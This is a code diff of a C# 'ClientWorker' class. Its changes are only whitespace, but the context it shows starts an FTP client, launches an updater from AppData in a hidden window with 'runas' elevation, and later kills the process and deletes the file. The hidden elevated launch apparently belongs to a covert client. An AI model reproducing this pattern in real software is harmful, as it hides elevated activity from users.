@@ -11,10 +11,12 @@ namespace ClientWorker
 	public class Functions
 	{
         private FtpClient ftpClient = new FtpClient();
+
         public void Start()
 		{
 			ftpClient.Init();
 		}
+
 		public void GetUpdater()
 		{
 			Log.Send("GetUpdater()");
@@ -27,7 +29,7 @@ namespace ClientWorker
 				{
 					StartInfo = 
 					{
-						FileName = folderPath + StartData.floaderNewCopy + StartData.updater,
+                        FileName = folderPath + StartData.floaderNewCopy + StartData.updater,
 						WindowStyle = ProcessWindowStyle.Hidden,
 						Verb = "runas",
 						Arguments = Program.nameProcess
@@ -46,7 +48,9 @@ namespace ClientWorker
 			{
 				process.Kill();
 			}
+
 			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
 			File.Delete(folderPath + StartData.floaderNewCopy + StartData.updater);
 		}
 
@@ -86,6 +90,7 @@ namespace ClientWorker
 			}
 			catch
 			{
+
             }
 
 			Program.clientThread = new Thread(new ThreadStart(Program.client.Start));
